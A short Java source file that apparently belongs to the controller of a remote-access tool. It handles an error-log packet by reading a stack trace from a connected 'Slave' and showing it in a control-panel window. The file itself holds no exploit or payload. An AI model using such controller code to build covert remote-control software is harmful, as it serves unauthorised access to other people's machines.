package com.redpois0n.packets;

import com.redpois0n.Slave;
import com.redpois0n.ui.frames.FrameControlPanel;
import com.redpois0n.ui.panels.PanelControlErrorLog;

public class PacketERRLOG extends Packet {

	@Override
	public void read(Slave slave, String line) throws Exception {
		String trace = slave.readLine();
		
		FrameControlPanel frame = FrameControlPanel.instances.get(slave);
		
		if (frame != null) {
			PanelControlErrorLog panel = (PanelControlErrorLog) frame.panels.get("error log");
			
			panel.getPane().setText(trace);
		}
	}

}
